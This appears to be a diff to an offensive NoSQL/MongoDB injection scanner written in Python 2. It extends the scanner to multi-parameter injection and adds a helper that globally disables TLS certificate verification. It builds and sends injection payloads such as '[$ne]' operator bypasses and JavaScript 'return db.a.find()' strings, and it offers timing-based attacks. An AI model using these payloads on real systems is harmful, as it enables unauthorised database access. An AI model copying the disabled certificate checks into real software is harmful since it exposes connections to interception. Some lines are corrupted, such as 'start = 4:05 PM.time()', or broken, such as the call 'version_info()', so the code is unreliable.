@@ -1,16 +1,30 @@
-import httplib2
 import urllib
 import urllib2
-import json
+import string
+import nsmmongo
+from sys import version_info
 import datetime
-import itertools
-import re
+import time
+import random
 
-def getApps(victim,webPort,uri,https,verb):
+def httpRequestor (httpReq):
+    #Need to determine version of Python that's running to figure out how to handle self-signed certs.
+    if version_info() >= (2,7,9):
+        import ssl
+        ssl._create_default_https_context = ssl._create_unverified_context
+
+
+
+
+
+
+def getApps(webPort,victim,uri,https,verb,requestHeaders):
     print "Web App Attacks (GET)"
     print "==============="
     paramName = []
     global testNum
+    global httpMethod
+    httpMethod = "GET"
     testNum = 1
     paramValue = []
     global vulnAddrs
@@ -19,6 +33,8 @@ def getApps(victim,webPort,uri,https,verb):
     possAddrs = []
     timeVulnsStr = []
     timeVulnsInt = []
+    yes_tag = ['y', 'Y']
+    no_tag = ['n', 'N']
     appUp = False
     strTbAttack = False
     intTbAttack = False
@@ -30,7 +46,6 @@ def getApps(victim,webPort,uri,https,verb):
     str24 = False
     global int24
     int24 = False
-    global requestHeaders
 
     #Verify app is working.
     print "Checking to see if site at " + str(victim) + ":" + str(webPort) + str(uri) + " is up..."
@@ -107,7 +122,7 @@ def getApps(victim,webPort,uri,https,verb):
 
         if errorCheck == False:
             injLen = int(len(urllib2.urlopen(req).read()))
-            checkResult(randLength,injLen,testNum)
+            checkResult(randLength,injLen,testNum,verb)
             testNum += 1
         else:
             testNum += 1
@@ -125,7 +140,7 @@ def getApps(victim,webPort,uri,https,verb):
 
         if errorCheck == False:
             injLen = int(len(urllib2.urlopen(req).read()))
-            checkResult(randLength,injLen,testNum)
+            checkResult(randLength,injLen,testNum,verb)
             testNum += 1
 
         else:
@@ -144,7 +159,7 @@ def getApps(victim,webPort,uri,https,verb):
 
         if errorCheck == False:
             injLen = int(len(urllib2.urlopen(req).read()))
-            checkResult(randLength,injLen,testNum)
+            checkResult(randLength,injLen,testNum,verb)
             testNum +=1
 
         else:
@@ -163,7 +178,7 @@ def getApps(victim,webPort,uri,https,verb):
 
         if errorCheck == False:
             injLen = int(len(urllib2.urlopen(req).read()))
-            checkResult(randLength,injLen,testNum)
+            checkResult(randLength,injLen,testNum,verb)
             testNum += 1
         else:
             testNum += 1
@@ -180,7 +195,7 @@ def getApps(victim,webPort,uri,https,verb):
 
         if errorCheck == False:
             injLen = int(len(urllib2.urlopen(req).read()))
-            checkResult(randLength,injLen,testNum)
+            checkResult(randLength,injLen,testNum,verb)
             testNum +=1
 
         else:
@@ -198,7 +213,7 @@ def getApps(victim,webPort,uri,https,verb):
 
         if errorCheck == False:
             injLen = int(len(urllib2.urlopen(req).read()))
-            checkResult(randLength,injLen,testNum)
+            checkResult(randLength,injLen,testNum,verb)
             testNum += 1
         else:
             testNum += 1
@@ -215,7 +230,7 @@ def getApps(victim,webPort,uri,https,verb):
 
         if errorCheck == False:
             injLen = int(len(urllib2.urlopen(req).read()))
-            checkResult(randLength,injLen,testNum)
+            checkResult(randLength,injLen,testNum,verb)
             testNum += 1
         else:
             testNum += 1
@@ -233,18 +248,19 @@ def getApps(victim,webPort,uri,https,verb):
 
         if errorCheck == False:
             injLen = int(len(urllib2.urlopen(req).read()))
-            checkResult(randLength,injLen,testNum)
+            checkResult(randLength,injLen,testNum,verb)
             testNum += 1
+
 
         doTimeAttack = raw_input("Start timing based tests (y/n)? ")
 
         if doTimeAttack in yes_tag:
             print "Starting Javascript string escape time based injection..."
             req = urllib2.Request(uriArray[18], None, requestHeaders)
-            start = 4:05 PM.time()
+            start = time.time()
             strTimeInj = urllib2.urlopen(req)
             page = strTimeInj.read()
-            end = 4:05 PM.time()
+            end = time.time()
             strTimeInj.close()
             #print str(end)
             #print str(start)
@@ -331,12 +347,14 @@ def getApps(victim,webPort,uri,https,verb):
     raw_input("Press enter to continue...")
     return()
 
-def postApps():
+def postApps(victim,webPort,uri,https,verb,postData,requestHeaders):
     print "Web App Attacks (POST)"
     print "==============="
     paramName = []
     paramValue = []
     global vulnAddrs
+    global httpMethod
+    httpMethod = "POST"
     vulnAddrs = []
     global possAddrs
     possAddrs = []
@@ -347,10 +365,8 @@ def postApps():
     intTbAttack = False
     trueStr = False
     trueInt = False
-    global postData
     global neDict
     global gtDict
-    global requestHeaders
     testNum = 1
 
     #Verify app is working.
@@ -447,7 +463,7 @@ def postApps():
 
         if errorCheck == False:
             injLen = int(len(urllib2.urlopen(req).read()))
-            checkResult(randLength,injLen,testNum)
+            checkResult(randLength,injLen,testNum,verb)
             testNum += 1
 
         else:
@@ -474,7 +490,7 @@ def postApps():
 
         if errorCheck == False:
             injLen = int(len(urllib2.urlopen(req).read()))
-            checkResult(randLength,injLen,testNum)
+            checkResult(randLength,injLen,testNum,verb)
             testNum += 1
 
         postData.update({injOpt:"a'; return db.a.find(); var dummy='!"})
@@ -491,7 +507,7 @@ def postApps():
 
         if errorCheck == False:
             injLen = int(len(urllib2.urlopen(req).read()))
-            checkResult(randLength,injLen,testNum)
+            checkResult(randLength,injLen,testNum,verb)
             testNum += 1
         else:
             testNum += 1
@@ -511,7 +527,7 @@ def postApps():
 
         if errorCheck == False:
             injLen = int(len(urllib2.urlopen(req).read()))
-            checkResult(randLength,injLen,testNum)
+            checkResult(randLength,injLen,testNum,verb)
             testNum += 1
         else:
             testNum += 1
@@ -532,7 +548,7 @@ def postApps():
 
         if errorCheck == False:
             injLen = int(len(urllib2.urlopen(req).read()))
-            checkResult(randLength,injLen,testNum)
+            checkResult(randLength,injLen,testNum,verb)
             testNum += 1
 
         else:
@@ -553,7 +569,7 @@ def postApps():
 
         if errorCheck == False:
             injLen = int(len(urllib2.urlopen(req).read()))
-            checkResult(randLength,injLen,testNum)
+            checkResult(randLength,injLen,testNum,verb)
             testNum += 1
 
         else:
@@ -575,7 +591,7 @@ def postApps():
 
         if errorCheck == False:
             injLen = int(len(urllib2.urlopen(req).read()))
-            checkResult(randLength,injLen,testNum)
+            checkResult(randLength,injLen,testNum,verb)
             testNum += 1
             print "\n"
         else:
@@ -595,7 +611,7 @@ def postApps():
 
         if errorCheck == False:
             injLen = int(len(urllib2.urlopen(req).read()))
-            checkResult(randLength,injLen,testNum)
+            checkResult(randLength,injLen,testNum,verb)
             testNum += 1
 
         else:
@@ -724,7 +740,7 @@ def errorTest (errorCheck,testNum):
 
 
 
-def checkResult(baseSize,respSize,testNum):
+def checkResult(baseSize,respSize,testNum,verb):
     global vulnAddrs
     global possAddrs
     global lt24
@@ -834,7 +850,7 @@ def buildUri(origUri, randValue):
     paramValue = []
     global uriArray
     uriArray = ["","","","","","","","","","","","","","","","","","",""]
-    injOpt = ""
+    injOpt = []
 
     #Split the string between the path and parameters, and then split each parameter
     try:
@@ -857,11 +873,17 @@ def buildUri(origUri, randValue):
         menuItem += 1
 
     try:
-        injIndex = raw_input("Which parameter should we inject? ")
-        injOpt = str(paramName[int(injIndex)-1])
-        print "Injecting the " + injOpt + " parameter..."
+        injIndex = raw_input("Enter parameters to inject in a comma separated list:  ")
 
-    except:
+        for params in injIndex.split(","):
+            injOpt.append(paramName[int(params)-1])
+
+        #injOpt = str(paramName[int(injIndex)-1])
+
+        for params in injOpt:
+            print "Injecting the " + params + " parameter..."
+
+    except Exception:
         raw_input("Something went wrong.  Press enter to return to the main menu...")
         return
 
@@ -887,7 +909,8 @@ def buildUri(origUri, randValue):
     uriArray[18] = split_uri[0] + "?"
 
     for item in paramName:
-        if paramName[x] == injOpt:
+
+        if paramName[x] in injOpt:
             uriArray[0] += paramName[x] + "=" + randValue + "&"
             uriArray[1] += paramName[x] + "[$ne]=" + randValue + "&"
             uriArray[2] += paramName[x] + "=a'; return db.a.find(); var dummy='!" + "&"
@@ -933,7 +956,7 @@ def buildUri(origUri, randValue):
 
     #Clip the extra & off the end of the URL
     x = 0
-    while x <= 17:
+    while x <= 18:
         uriArray[x]= uriArray[x][:-1]
         x += 1
 
@@ -941,6 +964,7 @@ def buildUri(origUri, randValue):
 
 def getDBInfo():
     curLen = 0
+    yes_tag = ['y', 'Y']
     nameLen = 0
     gotFullDb = False
     gotNameLen = False
